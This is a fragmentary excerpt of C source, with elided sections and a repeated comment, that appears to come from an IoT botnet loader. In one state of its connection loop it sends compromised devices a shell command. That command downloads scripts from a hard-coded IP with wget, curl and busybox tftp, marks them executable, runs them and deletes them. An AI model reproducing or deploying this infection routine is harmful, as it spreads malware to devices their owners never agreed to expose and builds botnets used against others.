                        ...
                        case 3:
                                {
                                        ...
                                        if(send(fds[i].fd, "cd /tmp; wget http://198.167.140.122/bins.sh || curl -O http://198.167.140.122/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 198.167.140.122 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 198.167.140.122; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh\r\n", 2, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 4;
                                }
                                break;
...
{
	//Ik this is like, extremely simple, but it works
	//Ik this is like, extremely simple, but it works
